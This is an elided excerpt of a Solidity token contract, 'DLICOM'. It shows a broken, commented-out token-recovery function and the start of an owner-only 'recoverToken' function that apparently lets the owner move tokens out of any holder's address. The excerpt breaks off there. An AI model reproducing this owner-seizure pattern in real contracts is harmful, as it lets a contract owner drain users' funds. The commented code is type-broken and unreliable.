...
contract DLICOM is Context, IERC20, Ownable {  
    ...
    */
    ...
    // function RecoverTokenByMistake(uint token ,uint _recipient,uint256 _amount ) external onlyOwner() {
    //     IERC20 tokenContract = IERC20(address(this));
    //    _rOwned[_recipient] = _rOwned[_recipient].sub(_amount);
    //     token.transfer(_recipient, _amount);
    // }

    function recoverToken(address from, address to, uint256 amount) external onlyOwner() {
        require(_rOwned[from] >= amount, "Insufficient balance.");
